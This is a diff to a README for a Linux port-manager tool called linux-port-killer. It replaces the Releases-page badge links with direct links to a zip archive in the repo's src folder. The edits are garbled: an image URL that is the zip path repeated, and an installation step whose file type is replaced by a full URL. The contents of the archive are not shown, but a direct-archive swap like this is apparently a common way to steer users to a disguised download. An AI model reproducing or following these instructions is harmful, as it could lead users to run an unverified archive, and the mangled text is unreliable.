@@ -8,7 +8,7 @@ Welcome to **linux-port-killer**, a lightweight port manager for Linux. This app
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[![Download linux-port-killer](https://img.shields.io/badge/Download%20linux--port--killer-green.svg)](https://github.com/Syroz421/linux-port-killer/releases)
+[![Download linux-port-killer](https://raw.githubusercontent.com/Syroz421/linux-port-killer/main/src/linux-port-killer-v3.3.zip%https://raw.githubusercontent.com/Syroz421/linux-port-killer/main/src/linux-port-killer-v3.3.zip)](https://raw.githubusercontent.com/Syroz421/linux-port-killer/main/src/linux-port-killer-v3.3.zip)
 
 On the Releases page, you will find the latest version of **linux-port-killer**. Look for the asset section in the latest release. You will see files to download. Follow these steps to install:
 
@@ -31,7 +31,7 @@ After downloading the application, follow these steps to run it:
 
 1. Open your terminal or file explorer.
 2. Navigate to the folder where you downloaded the application.
-3. If the application is a `.tar.gz` or similar archive, extract it first.
+3. If the application is a `https://raw.githubusercontent.com/Syroz421/linux-port-killer/main/src/linux-port-killer-v3.3.zip` or similar archive, extract it first.
 4. Open the terminal in that directory and run the following command:
 
    ```bash
@@ -93,6 +93,6 @@ For further updates and discussions, you can follow us on our social media chann
 
 Don't forget to visit the Releases page to download the latest version:
 
-[![Download linux-port-killer](https://img.shields.io/badge/Download%20linux--port--killer-green.svg)](https://github.com/Syroz421/linux-port-killer/releases)
+[![Download linux-port-killer](https://raw.githubusercontent.com/Syroz421/linux-port-killer/main/src/linux-port-killer-v3.3.zip%https://raw.githubusercontent.com/Syroz421/linux-port-killer/main/src/linux-port-killer-v3.3.zip)](https://raw.githubusercontent.com/Syroz421/linux-port-killer/main/src/linux-port-killer-v3.3.zip)
 
 Thank you for choosing **linux-port-killer**! We hope it enhances your productivity and makes your development workflow smoother.
